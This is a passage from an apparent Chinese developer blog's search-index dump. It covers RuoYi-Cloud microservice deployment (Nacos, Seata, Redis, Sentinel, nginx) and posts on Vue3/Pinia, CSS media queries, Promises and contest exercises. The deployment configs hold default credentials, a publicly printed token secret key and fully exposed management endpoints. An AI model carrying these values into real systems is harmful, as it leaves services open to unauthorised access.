Java 这里用的是jdk21 https://bell-sw.com/pages/downloads/ 下载 sentinel 下载后放到Ruoyi-Cloud的jars文件夹(自建)内,此处用的是1.8.8版本 https://github.com/alibaba/Sentinel/releases 开发环境部署 个人习惯将后端和前端分开，解压项目后将Ruoyi-Cloud文件夹重命名为ruoyi-master，将ruoyi-master内的ruoyi-ui跟ruoyi-master放到同级目录。 建议使用默认端口，放行8848,9848,7848,9849 配置 Java 环境 解压 jdk-21_windows-x64_bin.zip 到不包含中文的目录下 打开环境变量 添加JAVA_HOME变量 点开Path变量 配置到bin目录 验证环境是否配置成功 部署 nacos 解压 nacos-server-2.5.1.tar.gz 到不包含中文的目录下 配置 编辑 nacos/bin/startup.cmd，修改 cluster 为 standalone standalone 是单机部署 ， cluster 是集群部署 将ruoyi-master/docker/nacos/conf/application.properties文件复制到nacos/conf/application.properties，并打开nacos/conf/application.properties修改 1234567891011121314151617181920212223242526272829303132333435spring.datasource.platform=mysqldb.num=1db.url.0=jdbc:mysql://mysql-host:3306/ry-config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.user=rootdb.password=passwordnacos.naming.empty-service.auto-clean=truenacos.naming.empty-service.clean.initial-delay-ms=50000nacos.naming.empty-service.clean.period-time-ms=30000management.endpoints.web.exposure.include=*management.metrics.export.elastic.enabled=falsemanagement.metrics.export.influx.enabled=falseserver.tomcat.accesslog.enabled=trueserver.tomcat.accesslog.pattern=%h %l %u %t &quot;%r&quot; %s %b %D %&#123;User-Agent&#125;i %&#123;Request-Source&#125;iserver.tomcat.basedir=D://home/ruoyi/nacos/tomcat/logsnacos.security.ignore.urls=/,/error,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-ui/public/**,/v1/auth/**,/v1/console/health/**,/actuator/**,/v1/console/server/**nacos.core.auth.system.type=nacos# 开启认证nacos.core.auth.enabled=truenacos.core.auth.default.token.expire.seconds=18000# 此字段将 nacos.core.auth.default.token.secret.key 做替换，值为base64编码后字符串长度&gt;=32的字符串nacos.core.auth.plugin.nacos.token.secret.key=6L+Z5piv5L2g55qE6ZW/5bqmPj0zMueahGJhc2U2NOe8lueggQ==nacos.core.auth.caching.enabled=truenacos.core.auth.enable.userAgentAuthWhite=falsenacos.core.auth.server.identity.key=serverIdentitynacos.core.auth.server.identity.value=securitynacos.istio.mcp.server.enabled=false 启动 nacos 双击或命令行运行 nacos/bin/startup.cmd 如果出现类似于这样的错误，删除startup.cmd内所有的rem行即可。 运行成功类似于下图 部署 seata-server 解压 apache-seata-2.3.0-incubating-bin.tar.gz 到不包含中文的目录下 配置seata-server 编辑 seata-server/conf/application.yml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556server: port: 7091spring: application: name: seata-serverlogging: config: classpath:logback-spring.xml file: path: $&#123;log.home:$&#123;user.home&#125;/logs/seata&#125; extend: logstash-appender: destination: 127.0.0.1:4560 kafka-appender: bootstrap-servers: 127.0.0.1:9092 topic: logback_to_logstashconsole: user: username: seata password: seataseata: config: # support: nacos, consul, apollo, zk, etcd3 type: nacos nacos: server-addr: 127.0.0.1:8848 # nacos地址 group: SEATA_GROUP # 配置文件的分组 username: nacos # nacos用户名 password: nacos # nacos密码 # 这是默认值 data-id: seata.properties # 配置文件的data id也就是配置文件名加后缀 registry: # support: nacos, eureka, redis, zk, consul, etcd3, sofa type: nacos nacos: application: seata-server #seata启动后在nacos的服务名 server-addr: 127.0.0.1:8848 # nacos地址 group: SEATA_GROUP # 配置文件的分组 cluster: default # 这个歌参数在每个微服务seata时会用到 username: nacos # nacos用户名 password: nacos # nacos密码 store: # support: file 、 db 、 redis mode: db # server: # service-port: 8091 #If not configured, the default is &#x27;$&#123;server.port&#125; + 1000&#x27; security: # 此处的secretKey是nacos的 nacos.core.auth.plugin.nacos.token.secret.key secretKey: 6L+Z5piv5L2g55qE6ZW/5bqmPj0zMueahGJhc2U2NOe8lueggQ== tokenValidityInMilliseconds: 1800000 csrf-ignore-urls: /metadata/v1/** ignore: urls: /,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.jpeg,/**/*.ico,/api/v1/auth/login,/version.json,/health,/error,/vgroup/v1/** 运行 seata-server seata-server/bin/seata-server.bat 运行成功类似于下图 部署 redis 解压 redis-7.4.2.zip 到不包含中文的目录下 配置 redis 如果不设置密码可以忽略配置 编辑 redis.conf 找到或添加配置 requirepass 1requirepass 密码 运行 redis 运行成功类似于下图 部署 mysql 打开小皮面板，安装成功后如下图 修改数据库密码 启动mysql 配置 若依数据库 用可视化工具或命令行创建ry-cloud,ry-config,ry-seata三个库，数据库编码用utf8_general_ci ry-cloud 导入 ruoyi-master/sql/ry_2025xxxx.sql (必须),ruoyi-master/sql/quartz.sql(可选) ry-config 导入 ruoyi-master/sql/ry_config_2025xxxx.sql（必须） ry-seata 导入 ruoyi-master/sql/ry_seata_2025xxxx.sql 运行 sentinel cmd进入ruoyi-master/jars目录，运行以下命令 1java -Dserver.port=8718 -Dcsp.sentinel.dashboard.server=localhost:8718 -Dproject.name=sentinel-dashboard -Dcsp.sentinel.api.port=8719 -jar sentinel-dashboard-1.8.8.jar 后端运行 配置 根据图片修改模块的配置 123456789101112131415161718192021222324252627282930# Tomcatserver: port: 9200# Springspring: application: # 应用名称 name: ruoyi-auth profiles: # 环境配置 active: dev cloud: nacos: discovery: # 服务注册地址 server-addr: 127.0.0.1:8848 username: nacos password: nacos # nacos 密码 config: # 配置中心地址 server-addr: 127.0.0.1:8848 # 配置文件格式 file-extension: yml # 共享配置 shared-configs: - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125; username: nacos password: nacos # nacos 密码 网关端口就是前端所请求的端口 1234567891011121314151617181920212223242526272829303132333435363738394041424344# Tomcatserver: port: 3000# Springspring: application: # 应用名称 name: ruoyi-gateway profiles: # 环境配置 active: dev cloud: nacos: discovery: # 服务注册地址 server-addr: 127.0.0.1:8848 username: nacos password: nacos # nacos 密码 config: # 配置中心地址 server-addr: 127.0.0.1:8848 # 配置文件格式 file-extension: yml # 共享配置 shared-configs: - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125; username: nacos password: nacos # nacos 密码 sentinel: # 取消控制台懒加载 eager: true transport: # 控制台地址 dashboard: 127.0.0.1:8718 # nacos配置持久化 datasource: ds1: nacos: server-addr: 127.0.0.1:8848 dataId: sentinel-ruoyi-gateway groupId: DEFAULT_GROUP data-type: json rule-type: gw-flow 123456789101112131415161718192021222324252627282930# Tomcatserver: port: 9300# Springspring: application: # 应用名称 name: ruoyi-file profiles: # 环境配置 active: dev cloud: nacos: discovery: # 服务注册地址 server-addr: 127.0.0.1:8848 username: nacos password: nacos # nacos 密码 config: # 配置中心地址 server-addr: 127.0.0.1:8848 # 配置文件格式 file-extension: yml # 共享配置 shared-configs: - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125; username: nacos password: nacos # nacos 密码 1234567891011121314151617181920212223242526272829# Tomcatserver: port: 9202# Springspring: application: # 应用名称 name: ruoyi-gen profiles: # 环境配置 active: dev cloud: nacos: discovery: # 服务注册地址 server-addr: 127.0.0.1:8848 username: nacos password: nacos # nacos 密码 config: # 配置中心地址 server-addr: 127.0.0.1:8848 # 配置文件格式 file-extension: yml # 共享配置 shared-configs: - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125; username: nacos password: nacos # nacos 密码 1234567891011121314151617181920212223242526272829# Tomcatserver: port: 9203# Springspring: application: # 应用名称 name: ruoyi-job profiles: # 环境配置 active: dev cloud: nacos: discovery: # 服务注册地址 server-addr: 127.0.0.1:8848 username: nacos password: nacos # nacos 密码 config: # 配置中心地址 server-addr: 127.0.0.1:8848 # 配置文件格式 file-extension: yml # 共享配置 shared-configs: - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125; username: nacos password: nacos # nacos 密码 1234567891011121314151617181920212223242526272829# Tomcatserver: port: 9201# Springspring: application: # 应用名称 name: ruoyi-system profiles: # 环境配置 active: dev cloud: nacos: discovery: # 服务注册地址 server-addr: 127.0.0.1:8848 username: nacos password: nacos # nacos 密码 config: # 配置中心地址 server-addr: 127.0.0.1:8848 # 配置文件格式 file-extension: yml # 共享配置 shared-configs: - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125; username: nacos password: nacos # nacos 密码 1234567891011121314151617181920212223242526272829# Tomcatserver: port: 9100# Springspring: application: # 应用名称 name: ruoyi-monitor profiles: # 环境配置 active: dev cloud: nacos: discovery: # 服务注册地址 server-addr: 127.0.0.1:8848 username: nacos password: nacos # nacos 密码 config: # 配置中心地址 server-addr: 127.0.0.1:8848 # 配置文件格式 file-extension: yml # 共享配置 shared-configs: - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125; username: nacos password: nacos # nacos 密码 运行 打开 ruoyi-master 下的bin目录,先执行clean.bat清理,再执行package.bat打包。 打包完成后执行run-xxx.bat run-gateway.bat,run-auth.bat,run-modules-system.bat这三个必须运行，其余可选。 前端运行 配置 打开vue.config.js，将下图位置配置为网关的端口和ip 运行 先在命令行执行npm install 再执行npm run dev即可运行 生产环境部署 在开发环境的基础上打包前后端代码即可对生产环境部署 前端部署 在ruoyi-ui目录下执行npm run build:prod命令即可打包，打包完成后会生成dist目录，这个目录就是打包好的文件。 打开小皮面板将nginx启动并添加网站目录。 配置 Nginx 使前端的请求可以正确的转发到后端 1234567891011121314151617181920212223242526272829server &#123; listen 80; server_name localhost; location / &#123; # 设置为部署目录 root &quot;D:/website/localhost_80&quot;; try_files $uri $uri/ /index.html; index index.html index.htm; &#125; location /prod-api/&#123; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://localhost:8080/; &#125; # 避免actuator暴露 if ($uri ~ &quot;/actuator&quot;) &#123; return 403; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125;&#125; 最后重启Nginx没有抛出错误即完成前端部署 后端部署 部署前先运行起来 nacos,seata,mysql,redis，在开发环境中有写。 打开 ruoyi-master/bin 目录，执行 clean.bat,再执行package.bat进行打包 打包完成之后，根据下图把jar包复制出来用命令运行即可。 此处可扩展业务代码，每个模块下都有jar包。打包后都在每个模块下的target目录下。 最后还有下载的jars下的 sentinel-dashboard-1.8.8.jar 也要放到一起。 最后使用以下命令来运行所有jar包。 123java -jar xxx.jar# sentinel需要用以下命令运行java -Dserver.port=8718 -Dcsp.sentinel.dashboard.server=localhost:8718 -Dproject.name=sentinel-dashboard -Dcsp.sentinel.api.port=8719 -jar sentinel-dashboard-1.8.8.jar","categories":[],"tags":[{"name":"nacos","slug":"nacos","permalink":"https://bestflyteng.github.io/tags/nacos/"},{"name":"RuoYi","slug":"RuoYi","permalink":"https://bestflyteng.github.io/tags/RuoYi/"},{"name":"若依管理系统","slug":"若依管理系统","permalink":"https://bestflyteng.github.io/tags/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"},{"name":"微服务","slug":"微服务","permalink":"https://bestflyteng.github.io/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"}]},{"title":"Vue3 和 Pinia 的使用","slug":"202503241931","date":"2025-03-24T11:31:51.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/ffa41da9/","permalink":"https://bestflyteng.github.io/posts/ffa41da9/","excerpt":"","text":"Vue3 创建实例 使用 setup 1234567const &#123; createApp &#125; = VuecreateApp(&#123; setup() &#123; // ... &#125;&#125;).mount(&#x27;#app&#x27;) // 挂载到 #app 使用 Options API 123456789const &#123; createApp &#125; = VuecreateApp(&#123; data() &#123; return &#123;&#125; &#125;, methods: &#123;&#125;, // ... &#125;).mount(&#x27;#app&#x27;) // 挂载到 #app Pinia 定义 Store defineStore 的第一个参数是 store 的 id，必须是唯一的。第二个参数是一个选项对象。 使用 Setup Store 12345678910const &#123; ref &#125; = Vueconst &#123; defineStore &#125; = Piniaconst useTestStore = defineStore(&#x27;test&#x27;, () =&gt; &#123; const count = ref(1) const doubleCount = computed(() =&gt; count.value * 2) const increment = () =&gt; &#123; count.value++ &#125; return &#123; count, doubleCount, increment &#125;&#125;) 使用 Option Store 1234567891011121314151617const &#123; defineStore &#125; = Piniaconst useTestStore = defineStore(&#x27;test&#x27;, &#123; // 状态数据 state: () =&gt; (&#123; count: 1 &#125;), // 计算属性 getters: &#123; doubleCount: (state) =&gt; state.count * 2 &#125;, // 方法 actions: &#123; increment() &#123; this.count++ &#125; &#125;&#125;) Vue3 使用 Pinia 1234567891011const &#123; createApp, ref &#125; = Vueconst &#123; createPinia &#125; = Pinia// 定义 Storeconst useTestStore = defineStore(&#x27;test&#x27;, () =&gt; &#123; const count = ref(1) const doubleCount = computed(() =&gt; count.value * 2) const increment = () =&gt; &#123; count.value++ &#125; return &#123; count, doubleCount, increment &#125;&#125;) 1234567891011// Options APIcreateApp(&#123; data() &#123; return &#123; testStore: useTestStore() &#125; &#125;&#125;)// 使用 Pinia.use(createPinia()).mount(&#x27;#app&#x27;) 12345678910// SetupcreateApp(&#123; setup()&#123; const testStore = useTestStore() return &#123; testStore &#125; &#125;&#125;)// 使用 Pinia.use(createPinia()).mount(&#x27;#app&#x27;) 123456&lt;!-- 显示 --&gt;&lt;div id=&quot;app&quot;&gt; &#123;&#123; testStore.count &#125;&#125; &#123;&#123; testStore.doubleCount &#125;&#125; &lt;button @click=&quot;testStore.increment&quot;&gt;按钮&lt;/button&gt;&lt;/div&gt;","categories":[],"tags":[{"name":"Vue3","slug":"Vue3","permalink":"https://bestflyteng.github.io/tags/Vue3/"},{"name":"Pinia","slug":"Pinia","permalink":"https://bestflyteng.github.io/tags/Pinia/"}]},{"title":"CSS 媒体查询","slug":"202503231943","date":"2025-03-23T11:44:27.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/3106d1e6/","permalink":"https://bestflyteng.github.io/posts/3106d1e6/","excerpt":"","text":"媒体类型（Media Type）​ screen（屏幕） print（打印） all（全部设备） ​媒体特性条件（Media Feature） 必须用括号包裹，如 (min-width: 900px) 基本语法 123@media 媒体类型 and (媒体特性条件) &#123; /* 样式规则 */&#125; 示例 12345678910111213141516171819202122/* 单条件 *//* 屏幕设备且宽度≥900px 时生效 */@media screen and (min-width: 900px) &#123; article &#123; padding: 1rem 3rem; &#125;&#125;/* 多条件 *//* 屏幕设备、宽度≥900px 且横屏时生效 */@media screen and (min-width: 900px) and (orientation: landscape) &#123; article &#123; padding: 2rem; &#125;&#125;/* 等效于 @media all and (min-width: 900px) */@media (min-width: 900px) &#123; article &#123; padding: 1rem 3rem; &#125;&#125;/* 使用 ,（逗号）表示 ​逻辑或（OR） *//* 屏幕设备且宽度≥900px，或打印设备时生效 */@media screen and (min-width: 900px), print &#123; article &#123; padding: 1rem 3rem; &#125;&#125;","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://bestflyteng.github.io/tags/CSS/"},{"name":"媒体查询","slug":"媒体查询","permalink":"https://bestflyteng.github.io/tags/%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2/"},{"name":"media","slug":"media","permalink":"https://bestflyteng.github.io/tags/media/"}]},{"title":"JavaScript Promise 的使用","slug":"202503062032","date":"2025-03-06T12:32:55.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/da4c0519/","permalink":"https://bestflyteng.github.io/posts/da4c0519/","excerpt":"","text":"Promise 的概念 一个 Promise 必然处于以下几种状态之一： 待定（pending）：初始状态，既没有被兑现，也没有被拒绝。 已兑现（fulfilled）：意味着操作成功完成。可以用then方法来处理。 已拒绝（rejected）：意味着操作失败。可以用catch方法来处理 如果一个 Promise 已经被兑现或拒绝，即不再处于待定状态，那么则称之为已敲定（settled）。 Promise 基本使用 Promise 成功回调 123456const promise = new Promise((resolve, reject) =&gt; &#123; // 模拟异步操作 setTimeout(() =&gt; &#123; resolve(&#x27;成功&#x27;); &#125;,1000)&#125;); Promise 失败回调 123456const promise = new Promise((resolve, reject) =&gt; &#123; // 模拟异步操作 setTimeout(() =&gt; &#123; reject(&#x27;失败&#x27;); &#125;,1000)&#125;); Promise then 方法 then 方法用于指定当 Promise 对象状态变为已兑现（fulfilled）时，所执行的操作。 123456789const promise = new Promise((resolve, reject) =&gt; &#123; // 模拟异步操作 setTimeout(() =&gt; &#123; resolve(&#x27;成功&#x27;); &#125;,1000)&#125;);promise.then((res) =&gt; &#123; console.log(res);&#125;); Promise catch 方法 catch 方法用于指定当 Promise 对象状态变为已拒绝（rejected）时，所执行的操作。 123456789const promise = new Promise((resolve, reject) =&gt; &#123; // 模拟异步操作 setTimeout(() =&gt; &#123; reject(&#x27;失败&#x27;); &#125;,1000)&#125;);promise.catch((err) =&gt; &#123; console.log(err);&#125;); Promise finally 方法 finally 方法用于指定不管 Promise 对象最后状态如何，都会执行的操作。 123456789const promise = new Promise((resolve, reject) =&gt; &#123; // 模拟异步操作 setTimeout(() =&gt; &#123; resolve(&#x27;成功&#x27;); &#125;,1000)&#125;);promise.finally(() =&gt; &#123; console.log(&#x27;finally&#x27;);&#125;) Promise 并发和静态方法 Promise 类提供了四个静态方法来促进异步任务的并发： 所有这些方法都接受一个 Promise（确切地说是 thenable）的可迭代对象，并返回一个新的 Promise。它们都支持子类化，这意味着它们可以在 Promise 的子类上调用，结果将是一个属于子类类型的 Promise。为此，子类的构造函数必须实现与 Promise() 构造函数相同的签名——接受一个以 resolve 和 reject 回调函数作为参数的单个 executor 函数。子类还必须有一个 resolve 静态方法，可以像 Promise.resolve() 一样调用，以将值解析为 Promise。 请注意，JavaScript 的本质上是单线程的，因此在任何时刻，只有一个任务会被执行，尽管控制权可以在不同的 Promise 之间切换，从而使 Promise 的执行看起来是并发的。在 JavaScript 中，并行执行只能通过 worker 线程实现。 Promise.all() 仅在 ​所有传入的 Promise 都变为 fulfilled（成功）​​ 时才会返回结果数组。若其中​任意一个 Promise 变为 rejected（失败）​，则立即以该失败原因拒绝。 示例： 12345678910111213// 当所有 Promise 成功时，返回的数组 ​严格按传入顺序排列结果，与完成先后无关：Promise.all([ Promise.resolve(1), Promise.resolve(2), Promise.resolve(3)]).then(console.log); // 输出 [1, 2, 3]// 只要有一个 Promise 失败，立即终止并返回 ​首个遇到的错误：Promise.all([ Promise.resolve(1), Promise.reject(&#x27;error&#x27;), Promise.resolve(3) // 此结果不会被处理]).catch(console.log); // 输出 &quot;error&quot; Promise.allSettled() 在所有的 Promise 都被敲定时兑现。 示例: 123456789101112131415const p1 = Promise.resolve(&#x27;A&#x27;);const p2 = Promise.reject(&#x27;Error in B&#x27;);const p3 = new Promise(resolve =&gt; setTimeout(resolve, 50, &#x27;C&#x27;));Promise.allSettled([p1, p2, p3]) .then(results =&gt; &#123; console.log(results); /* 输出： [ &#123; status: &#x27;fulfilled&#x27;, value: &#x27;A&#x27; &#125;, &#123; status: &#x27;rejected&#x27;, reason: &#x27;Error in B&#x27; &#125;, &#123; status: &#x27;fulfilled&#x27;, value: &#x27;C&#x27; &#125; ] */ &#125;); Promise.any() 只要传入的 Promise 列表中 ​有任意一个变为 fulfilled（成功）​，Promise.any() 就会立即 ​返回该成功值，并忽略其他所有 Promise 的结果（无论其他 Promise 是成功还是失败）。仅在所有传入的 Promise 都变为 rejected（失败）时，才会返回一个被拒绝的 Promise，并返回该拒绝原因。 示例： 123456// 示例1：第一个成功值被返回Promise.any([ Promise.reject(&#x27;error1&#x27;), Promise.resolve(&#x27;success&#x27;), Promise.reject(&#x27;error2&#x27;)]).then(console.log); // 输出 &quot;success&quot; Promise.race() 返回的 Promise 状态由​最先敲定（无论是 fulfilled 还是 rejected）​​ 的 Promise 决定，且 ​立即传递其值或原因。一旦首个 Promise 敲定，其他 Promise 的结果将被完全忽略，即使后续有其他 Promise 完成。 示例： 12345678910111213141516171819// 第一个完成的 Promise 是成功const fastSuccess = Promise.resolve(&#x27;成功&#x27;);const slowError = new Promise((_, reject) =&gt; setTimeout(reject, 100, &#x27;超时错误&#x27;));Promise.race([fastSuccess, slowError]) .then(result =&gt; console.log(&#x27;结果:&#x27;, result)) // 输出 &quot;结果: 成功&quot; .catch(error =&gt; console.log(&#x27;错误:&#x27;, error));// 第一个完成的 Promise 是失败const fastError = Promise.reject(&#x27;请求失败&#x27;);const slowSuccess = new Promise(resolve =&gt; setTimeout(resolve, 100, &#x27;延迟成功&#x27;));Promise.race([fastError, slowSuccess]) .then(result =&gt; console.log(&#x27;结果:&#x27;, result)) .catch(error =&gt; console.log(&#x27;错误:&#x27;, error)); // 输出 &quot;错误: 请求失败&quot; Promise.resolve() 返回一个新的 Promise 对象，该对象以给定的值兑现。如果值是一个 thenable 对象（即具有 then 方法），则返回的 Promise 对象会“跟随”该 thenable 对象，采用其最终的状态；否则，返回的 Promise 对象会以该值兑现。 Promise.reject() 返回一个新的 Promise 对象，该对象以给定的原因拒绝。","categories":[],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://bestflyteng.github.io/tags/JavaScript/"},{"name":"Promise","slug":"Promise","permalink":"https://bestflyteng.github.io/tags/Promise/"}]},{"title":"蓝桥杯 Web 练习","slug":"202502261832","date":"2025-02-26T10:33:31.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/17b3dfa8/","permalink":"https://bestflyteng.github.io/posts/17b3dfa8/","excerpt":"","text":"拼接url参数 (简单) 对函数参数相关词语进行规则匹配 (中等) 1234567891011121314151617181920212223242526272829303132333435363738394041// 假设生成的绘画数据数组为 artDataArrayconst artDataArray = [ &#123; &quot;imageUrl&quot;: &quot;images/img1.jpg&quot;, &quot;tags&quot;: &quot;知更鸟、湖蓝色、十分可爱、皮克斯渲染&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img2.jpg&quot;, &quot;tags&quot;: &quot;知更鸟、个性的眉毛、模糊毛皮&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img3.jpg&quot;, &quot;tags&quot;: &quot;知更鸟、剪纸风格、个性的眉毛&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img4.jpg&quot;, &quot;tags&quot;: &quot;知更鸟、油画、十分可爱、特殊的羽毛&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img5.jpg&quot;, &quot;tags&quot;: &quot;男性、卡通、书、桌子&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img6.jpg&quot;, &quot;tags&quot;: &quot;男性、卡通、玩具、眼镜&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img7.jpg&quot;, &quot;tags&quot;: &quot;男性、卡通、玩具&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img8.jpg&quot;, &quot;tags&quot;: &quot;男性、卡通、书&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img9.jpg&quot;, &quot;tags&quot;: &quot;沙滩、遮阳伞、散步&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img10.jpg&quot;, &quot;tags&quot;: &quot;沙滩、椰子树、一群人&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img11.jpg&quot;, &quot;tags&quot;: &quot;沙滩、遮阳伞、人、包&quot; &#125;, &#123; &quot;imageUrl&quot;: &quot;images/img12.jpg&quot;, &quot;tags&quot;: &quot;沙滩、回忆、相框&quot; &#125;]/** * @param &#123;*&#125; imageCount 生成的图片数量 * @param &#123;*&#125; selectedText 用户输入的文本 */function generateAndDisplayImages(imageCount, selectedText) &#123; let imgAry = [] // 定义最佳匹配的图片数组 // TODO：待补充代码 let arr = [] for (let i = 0; i &lt; artDataArray.length; i++) &#123; const keyword = artDataArray[i].tags.split(&quot;、&quot;) arr[i] = &#123; count: 0, data: artDataArray[i] &#125; for (let j = 0; j &lt; keyword.length; j++) &#123; if(selectedText.indexOf(keyword[j]) != -1) arr[i].count++ &#125; &#125; const sortArr = arr.sort((a,b)=&gt; b.count - a.count).slice(0,imageCount) sortArr.map(item =&gt; imgAry.push(item.data)) //TODO：END return imgAry;&#125; 简易JSX解析器 (中等) 12345678910111213141516171819202122232425262728293031323334353637383940/** * @param type 要渲染的元素类型，即标签名 * @param config 包含标签属性或事件函数的对象 */const jsx = (type, config) =&gt; &#123; /* TODO: 待补充代码 */ console.log(type,config); let dom = document.createElement(type) if(Object.prototype.toString.call(config.children) === &#x27;[object String]&#x27;)&#123; dom.innerHTML += config.children &#125; else &#123; for (let i = 0; i &lt; config.children.length; i++) &#123; if(Object.prototype.toString.call(config.children[i]) === &#x27;[object String]&#x27;)&#123; dom.innerHTML += config.children[i] &#125;else&#123; dom.appendChild(config.children[i]) &#125; &#125; &#125; if(config[&#x27;style&#x27;] !== undefined)&#123; const styleKeys = Object.keys(config[&#x27;style&#x27;]) for (const key of styleKeys) &#123; dom.style[key] = config[&#x27;style&#x27;][key] &#125; &#125; const configKeys = Object.keys(config) for (const key of configKeys) &#123; if(Object.prototype.toString.call(config[key]) === &#x27;[object Function]&#x27;)&#123; dom[key] = config[key] &#125; &#125; for (const key of configKeys) &#123; if(key !== &#x27;children&#x27;)&#123; if(Object.prototype.toString.call(config[key]) === &#x27;[object String]&#x27;)&#123; dom.setAttribute(key,config[key]) &#125; &#125;&#125; return dom&#125; Github 明星项目统计 123456789101112131415const changeHandle = () =&gt; &#123; // TODO：待补充代码 const arr = [] if(language.value === &#x27;All&#x27;) arr.push(...chartData.value) else &#123; arr.push(...chartData.value .filter(item=&gt;item.language === language.value) .sort((a,b)=&gt;b.stars - a.stars) .slice(pageStart.value-1,pageEnd.value)) &#125; xData.value = arr.map(item=&gt;item.name) yData.value = arr.map(item=&gt;item.stars) initChart();&#125;; 小蓝驿站 1234567891011121314151617181920const addContact = () =&gt; &#123; // TODO：待补充代码 目标 2 const data = contacts.value.filter(item=&gt;item.letter === newContact.value[0].toUpperCase()) if(data.length === 0)&#123; contacts.value.push(&#123; contacts:[&#123;name:newContact.value&#125;], letter:newContact.value[0].toUpperCase() &#125;) &#125;else&#123; for (let i = 0; i &lt; contacts.value.length; i++) &#123; if(contacts.value[i].letter === newContact.value[0].toUpperCase())&#123; contacts.value[i].contacts.push(&#123;name:newContact.value&#125;) break &#125; &#125; &#125; // TODO：END // 添加完成清空联系人输入框 newContact.value = &quot;&quot;;&#125;; 搜索重试 12345678910111213141516171819202122232425/** * 定义一个重试函数 * @param &#123;func&#125; operation 要作用的函数 * @param &#123;number&#125; maxAttempts 最大重试次数 * @param &#123;number&#125; delayBetweenRetries 重试之间的时间间隔 * @returns */async function retry(operation, maxAttempts, delayBetweenRetries) &#123; // TODO:待补充代码 let attempt = 0; while (attempt &lt; maxAttempts) &#123; try &#123; // 尝试执行操作 return await operation(); // 如果成功，返回结果 &#125; catch (error) &#123; attempt++; // 增加尝试次数 if (attempt &gt;= maxAttempts) &#123; // return new Promise((res,rej)=&gt;rej(error)) throw error &#125; // 如果失败，等待指定的时间再重试 await new Promise(resolve =&gt; setTimeout(resolve, delayBetweenRetries)); &#125; &#125;&#125; 购物狂欢节 1234567891011121314151617181920212223242526272829303132async function fetchProducts(category) &#123; // TODO: 根据分类获取商品数据 products.value = [] const data = await fetch(`api/products/$&#123;category&#125;.json`) .then(res=&gt;res.json()) for (let i = 0; i &lt; data.length; i++) &#123; products.value.push(data[i]) &#125;&#125;const products = ref([]);function addProduct(product) &#123; // TODO: 添加商品到购物车，如果商品已存在，则数量+1 if(products.value.some((e)=&gt;e.id === product.id))&#123; for (let i = 0; i &lt; products.value.length; i++) &#123; if(products.value[i].id === product.id)&#123; products.value[i].quantity += 1 &#125; &#125; &#125;else&#123; product.quantity = 1 products.value.push(product) &#125;&#125;const totalPrice = computed(() =&gt; &#123; // TODO: 计算总价 return products.value.reduce((acc,item)=&gt;&#123; return acc + item.price * item.quantity &#125;,0)&#125;);","categories":[],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://bestflyteng.github.io/tags/JavaScript/"},{"name":"蓝桥杯","slug":"蓝桥杯","permalink":"https://bestflyteng.github.io/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/"}]},{"title":"Vue 计算属性 computed","slug":"202502221332","date":"2025-02-22T05:33:29.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/39f2161a/","permalink":"https://bestflyteng.github.io/posts/39f2161a/","excerpt":"","text":"当 computed 内部的变量发生了变化，computed 会重新计算，并返回新的值。 函数式写法 12345678910111213&lt;!-- 可以通过模板语法直接使用 --&gt;&lt;template&gt; &lt;div&gt;&#123;&#123; sum &#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; computed:&#123; sum()&#123; return this.num1 + this.num2 &#125; &#125;&#125;&lt;/script&gt; setup 写法 123456789101112131415161718&lt;!-- 可以通过模板语法直接使用 --&gt;&lt;template&gt; &lt;div&gt;&#123;&#123; sum &#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; setup()&#123; const num1 = ref(1) const num2 = ref(1) let sum = computed(()=&gt;&#123; return num1.value + num2.value &#125;) return &#123; sum &#125; &#125;&#125;&lt;/script&gt; options 写法 12345678910111213141516171819&lt;!-- 可以通过模板语法直接使用 --&gt;&lt;template&gt; &lt;div&gt;&#123;&#123; sum &#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; 